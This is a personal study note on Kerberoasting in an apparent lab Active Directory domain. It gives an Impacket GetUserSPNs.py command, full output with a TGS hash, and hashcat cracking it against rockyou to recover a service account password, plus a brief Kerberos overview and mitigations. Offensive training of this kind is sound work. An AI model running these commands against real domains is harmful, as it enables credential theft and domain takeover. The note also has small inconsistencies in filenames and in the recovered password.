
## Quick-Use

**Commands**:
- `GetUserSPNs.py DOMAIN/uname:Passwd! -dc-ip TARGDCIP -request`

*Tools*:
- `GetUserSPNs.py`
- `Hashcat`

## General

**Objectives**:
Quick way to own Domain Admin.

**Overview**:

Takes advantage of service accounts.

*Typical Kerberos, in a nutshell*:
0. User needs an Application. The application is a service provided by a server
1. User logs into the Active Directory via auth to the Domain Controller, using the user's password
2. the DC sends the user a Kerberos Ticket Granting Ticket (TGT).  the TGT is presented to any DC to prove auth for Kerberos service tickets.
3. The user opens the service which causes the user's workstation to lookup the Service Principal Name (SPN) for the User's service server
4. Once the SPN is identified the computer communicates with a DC again and presents the user's TGT as well as the SPN for the resource to which the user needs to communicate
5. the DG replies with the Ticket Granting Service (TGS) Kerberos service ticket.
6. The user's workstation presents the TGS to the service's server for access
7. Application 



![[Pasted image 20251116152007.png]]


## Mitigations

1. Strong Passwords -> good password, also have passwords stored securely
2. Least privilege -> DO NOT have the service account run as Domain Admin
## Examples

*note*: the desired hash from the below is:
```
$krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$d419b7809a42f1567e9a43137cdc396f$4817b491c83138a1d41ef729f26553ee3cc78eeff46352976897993ef7e9b421a6639fdb2d6ff8f5f6eb0443fbb4da834fcfe386a1af08091d5c455e229d697e30c1b130a363966bb73853b0ffa6f3975396cd2ca1be2c547676f3c5299e813d1da36f9844ab50fead6b08abb6bb240dea23f1f4b0130436687ddcefd37105ade565a1a8e978ecf7cd0d2ced5fc2ad64f4c3d18eafc85e1314602e3e5320b6658ff8234fd35686d53d2fba6d28423eb14623e44983baae243aea1ef69fac403a6ddf86df5c4d3279a9d331c93618e54822323c2cdac51f0161b5078223f1358722d945f97d7a7be174422841f92689e05b9e62415240bcccdf9092e3ce4a3363bb5e3c09d979580a4e24e8bba37441d1c124f7961a0b179044c1a164def3a5c026b9de68b4b22686897e8ee7e82f461e016eb8f77d9247eb7463b374a52b06de22422085d16686fd3dc3ad4da4444a46421f732443a596a02416764d15c688bf403199e805a99a4fec72a544b712b897ac7c079ffa947abdd3bc0ca30d75cc18354bf76f1fa7e27171b7eaf4a8fe5f0a0b692eac06d0cb4dd57ab1d35de033402794a5cd8bc25d3553fa4103b9bc5706f12d64ef1bd9cdaa3d8d0a530a4fc15e29bc298a37d9f164b2a2920cd6742c3fe12b758b668fb74a52fc122222050f6dfe1bd943a09f7acffdd29aad0798dabbc7717db83edb1bfcdf0a7a54cecea9467e73fc1bab1bb55f72828c972097499063b410b1aab0a34aa96c640b60309acf8e1a76f7e7ad2e13cc70a6e1aac555cd2120d9c18215197b26b5bc0335973062f4d75e92b8b2a2cfe3c568abe47d63d7f3372714a2b4dfd2b6a2c729eab0480353d0e5590f59c1d07b916febfb6ef52d3ecb2f00d0d39f628ce5e904dc123d261b538ffdd3f59b95cc0eac0f7ccddd1bbf5b62671d924e6990c5c12ef7e4daaecc57f7cbbd191da63f6854c8c5e75bcad43321e44bb306e201b78673b72cb11cdbe5fe01a5746a73d0bb54da056d8ca707aeefabd6d196f1904f0cd3cd32e838d4bf8bca9c6312c061dafb14b757981aefe015e82f6dadf2faaf846a4600afc65b81434957789a9af5bb80047eda333ffb7d8997308dcaa94ee2013581ac299c6af46e4cf12e7ce17623589d2b15a6c7dac500e58fa7c46f4cd3d21abdaa2acb08708d64e0f3b51d98f3d71af47c0cf2887957cb282c4cab87204c61e287b9c5df87c91ca7f13b8f5716772fb5b2a41b0999a47b8a2a53869be338e8f1c741c737f311b6ea0b770e5bb089981b72a3e344912daf6b7315540b85c338eeb21fc22ee065c4cfbd1f82661c64a3f65af673a6312b39840023efcdd152f4c2259fab21240c7a89d6e059705eb2edc18e759c09fda01d38da1884799c0e257556f240c8dcd34d5a5304c4d16dff3840d3f62bd05312da7224601a6f5f38dc
```

*Full command output example*

First we get the hash with `GetUserSPNs.py`
```bash
┌──(l1ch㉿kali)-[~]
└─$ sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.109.137 -request
[sudo] password for l1ch: 
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

ServicePrincipalName                    Name        MemberOf                                                     PasswordLastSet      LastLogon 
--------------------------------------  ----------  -----------------------------------------------------------  -------------------  ---------
HYDRA-DC/SQLService.MARVEL.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2025-11-02 20:51:12  <never>   



$krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$d419b7809a42f1567e9a43137cdc396f$4817b491c83138a1d41ef729f26553ee3cc78eeff46352976897993ef7e9b421a6639fdb2d6ff8f5f6eb0443fbb4da834fcfe386a1af08091d5c455e229d697e30c1b130a363966bb73853b0ffa6f3975396cd2ca1be2c547676f3c5299e813d1da36f9844ab50fead6b08abb6bb240dea23f1f4b0130436687ddcefd37105ade565a1a8e978ecf7cd0d2ced5fc2ad64f4c3d18eafc85e1314602e3e5320b6658ff8234fd35686d53d2fba6d28423eb14623e44983baae243aea1ef69fac403a6ddf86df5c4d3279a9d331c93618e54822323c2cdac51f0161b5078223f1358722d945f97d7a7be174422841f92689e05b9e62415240bcccdf9092e3ce4a3363bb5e3c09d979580a4e24e8bba37441d1c124f7961a0b179044c1a164def3a5c026b9de68b4b22686897e8ee7e82f461e016eb8f77d9247eb7463b374a52b06de22422085d16686fd3dc3ad4da4444a46421f732443a596a02416764d15c688bf403199e805a99a4fec72a544b712b897ac7c079ffa947abdd3bc0ca30d75cc18354bf76f1fa7e27171b7eaf4a8fe5f0a0b692eac06d0cb4dd57ab1d35de033402794a5cd8bc25d3553fa4103b9bc5706f12d64ef1bd9cdaa3d8d0a530a4fc15e29bc298a37d9f164b2a2920cd6742c3fe12b758b668fb74a52fc122222050f6dfe1bd943a09f7acffdd29aad0798dabbc7717db83edb1bfcdf0a7a54cecea9467e73fc1bab1bb55f72828c972097499063b410b1aab0a34aa96c640b60309acf8e1a76f7e7ad2e13cc70a6e1aac555cd2120d9c18215197b26b5bc0335973062f4d75e92b8b2a2cfe3c568abe47d63d7f3372714a2b4dfd2b6a2c729eab0480353d0e5590f59c1d07b916febfb6ef52d3ecb2f00d0d39f628ce5e904dc123d261b538ffdd3f59b95cc0eac0f7ccddd1bbf5b62671d924e6990c5c12ef7e4daaecc57f7cbbd191da63f6854c8c5e75bcad43321e44bb306e201b78673b72cb11cdbe5fe01a5746a73d0bb54da056d8ca707aeefabd6d196f1904f0cd3cd32e838d4bf8bca9c6312c061dafb14b757981aefe015e82f6dadf2faaf846a4600afc65b81434957789a9af5bb80047eda333ffb7d8997308dcaa94ee2013581ac299c6af46e4cf12e7ce17623589d2b15a6c7dac500e58fa7c46f4cd3d21abdaa2acb08708d64e0f3b51d98f3d71af47c0cf2887957cb282c4cab87204c61e287b9c5df87c91ca7f13b8f5716772fb5b2a41b0999a47b8a2a53869be338e8f1c741c737f311b6ea0b770e5bb089981b72a3e344912daf6b7315540b85c338eeb21fc22ee065c4cfbd1f82661c64a3f65af673a6312b39840023efcdd152f4c2259fab21240c7a89d6e059705eb2edc18e759c09fda01d38da1884799c0e257556f240c8dcd34d5a5304c4d16dff3840d3f62bd05312da7224601a6f5f38dc
                                                                                                                  
┌──(l1ch㉿kali)-[~]
└─$ 
```

then we load the hash and crack it:

```bash
# loading the hash
┌──(l1ch㉿kali)-[~]
└─$ vim krg.txt   
```

in krg.txt
```hash
$krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$d419b7809a42f1567e9a43137cdc396f$4817b491c83138a1d41ef729f26553ee3cc78eeff46352976897993ef7e9b421a6639fdb2d6ff8f5f6eb0443fbb4da834fcfe386a1af08091d5c455e229d697e30c1b130a363966bb73853b0ffa6f3975396cd2ca1be2c547676f3c5299e813d1da36f9844ab50fead6b08abb6bb240dea23f1f4b0130436687ddcefd37105ade565a1a8e978ecf7cd0d2ced5fc2ad64f4c3d18eafc85e1314602e3e5320b6658ff8234fd35686d53d2fba6d28423eb14623e44983baae243aea1ef69fac403a6ddf86df5c4d3279a9d331c93618e54822323c2cdac51f0161b5078223f1358722d945f97d7a7be174422841f92689e05b9e62415240bcccdf9092e3ce4a3363bb5e3c09d979580a4e24e8bba37441d1c124f7961a0b179044c1a164def3a5c026b9de68b4b22686897e8ee7e82f461e016eb8f77d9247eb7463b374a52b06de22422085d16686fd3dc3ad4da4444a46421f732443a596a02416764d15c688bf403199e805a99a4fec72a544b712b897ac7c079ffa947abdd3bc0ca30d75cc18354bf76f1fa7e27171b7eaf4a8fe5f0a0b692eac06d0cb4dd57ab1d35de033402794a5cd8bc25d3553fa4103b9bc5706f12d64ef1bd9cdaa3d8d0a530a4fc15e29bc298a37d9f164b2a2920cd6742c3fe12b758b668fb74a52fc122222050f6dfe1bd943a09f7acffdd29aad0798dabbc7717db83edb1bfcdf0a7a54cecea9467e73fc1bab1bb55f72828c972097499063b410b1aab0a34aa96c640b60309acf8e1a76f7e7ad2e13cc70a6e1aac555cd2120d9c18215197b26b5bc0335973062f4d75e92b8b2a2cfe3c568abe47d63d7f3372714a2b4dfd2b6a2c729eab0480353d0e5590f59c1d07b916febfb6ef52d3ecb2f00d0d39f628ce5e904dc123d261b538ffdd3f59b95cc0eac0f7ccddd1bbf5b62671d924e6990c5c12ef7e4daaecc57f7cbbd191da63f6854c8c5e75bcad43321e44bb306e201b78673b72cb11cdbe5fe01a5746a73d0bb54da056d8ca707aeefabd6d196f1904f0cd3cd32e838d4bf8bca9c6312c061dafb14b757981aefe015e82f6dadf2faaf846a4600afc65b81434957789a9af5bb80047eda333ffb7d8997308dcaa94ee2013581ac299c6af46e4cf12e7ce17623589d2b15a6c7dac500e58fa7c46f4cd3d21abdaa2acb08708d64e0f3b51d98f3d71af47c0cf2887957cb282c4cab87204c61e287b9c5df87c91ca7f13b8f5716772fb5b2a41b0999a47b8a2a53869be338e8f1c741c737f311b6ea0b770e5bb089981b72a3e344912daf6b7315540b85c338eeb21fc22ee065c4cfbd1f82661c64a3f65af673a6312b39840023efcdd152f4c2259fab21240c7a89d6e059705eb2edc18e759c09fda01d38da1884799c0e257556f240c8dcd34d5a5304c4d16dff3840d3f62bd05312da7224601a6f5f38dc
```

```bash
# cracking the hash
┌──(l1ch㉿kali)-[~]
└─$ hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 5800X 8-Core Processor, 2930/5861 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (5596 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$d419b7809a42f1567e9a43137cdc396f$4817b491c83138a1d41ef729f26553ee3cc78eeff46352976897993ef7e9b421a6639fdb2d6ff8f5f6eb0443fbb4da834fcfe386a1af08091d5c455e229d697e30c1b130a363966bb73853b0ffa6f3975396cd2ca1be2c547676f3c5299e813d1da36f9844ab50fead6b08abb6bb240dea23f1f4b0130436687ddcefd37105ade565a1a8e978ecf7cd0d2ced5fc2ad64f4c3d18eafc85e1314602e3e5320b6658ff8234fd35686d53d2fba6d28423eb14623e44983baae243aea1ef69fac403a6ddf86df5c4d3279a9d331c93618e54822323c2cdac51f0161b5078223f1358722d945f97d7a7be174422841f92689e05b9e62415240bcccdf9092e3ce4a3363bb5e3c09d979580a4e24e8bba37441d1c124f7961a0b179044c1a164def3a5c026b9de68b4b22686897e8ee7e82f461e016eb8f77d9247eb7463b374a52b06de22422085d16686fd3dc3ad4da4444a46421f732443a596a02416764d15c688bf403199e805a99a4fec72a544b712b897ac7c079ffa947abdd3bc0ca30d75cc18354bf76f1fa7e27171b7eaf4a8fe5f0a0b692eac06d0cb4dd57ab1d35de033402794a5cd8bc25d3553fa4103b9bc5706f12d64ef1bd9cdaa3d8d0a530a4fc15e29bc298a37d9f164b2a2920cd6742c3fe12b758b668fb74a52fc122222050f6dfe1bd943a09f7acffdd29aad0798dabbc7717db83edb1bfcdf0a7a54cecea9467e73fc1bab1bb55f72828c972097499063b410b1aab0a34aa96c640b60309acf8e1a76f7e7ad2e13cc70a6e1aac555cd2120d9c18215197b26b5bc0335973062f4d75e92b8b2a2cfe3c568abe47d63d7f3372714a2b4dfd2b6a2c729eab0480353d0e5590f59c1d07b916febfb6ef52d3ecb2f00d0d39f628ce5e904dc123d261b538ffdd3f59b95cc0eac0f7ccddd1bbf5b62671d924e6990c5c12ef7e4daaecc57f7cbbd191da63f6854c8c5e75bcad43321e44bb306e201b78673b72cb11cdbe5fe01a5746a73d0bb54da056d8ca707aeefabd6d196f1904f0cd3cd32e838d4bf8bca9c6312c061dafb14b757981aefe015e82f6dadf2faaf846a4600afc65b81434957789a9af5bb80047eda333ffb7d8997308dcaa94ee2013581ac299c6af46e4cf12e7ce17623589d2b15a6c7dac500e58fa7c46f4cd3d21abdaa2acb08708d64e0f3b51d98f3d71af47c0cf2887957cb282c4cab87204c61e287b9c5df87c91ca7f13b8f5716772fb5b2a41b0999a47b8a2a53869be338e8f1c741c737f311b6ea0b770e5bb089981b72a3e344912daf6b7315540b85c338eeb21fc22ee065c4cfbd1f82661c64a3f65af673a6312b39840023efcdd152f4c2259fab21240c7a89d6e059705eb2edc18e759c09fda01d38da1884799c0e257556f240c8dcd34d5a5304c4d16dff3840d3f62bd05312da7224601a6f5f38dc:MYpassword123#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLSe...5f38dc
Time.Started.....: Sun Nov 16 16:00:38 2025 (6 secs)
Time.Estimated...: Sun Nov 16 16:00:44 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2009.4 kH/s (1.38ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10846208/14344385 (75.61%)
Rejected.........: 0/10846208 (0.00%)
Restore.Point....: 10842112/14344385 (75.58%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Magic01 -> MYSELFonly4EVER
Hardware.Mon.#01.: Util: 77%

Started: Sun Nov 16 16:00:27 2025
Stopped: Sun Nov 16 16:00:44 2025
```

**Password is**: `MYpassword123`
## Glossary

*KDC*: Key Distribution center
*TGT*: Ticket Granting Ticket
*TGS*: Ticket granting service, 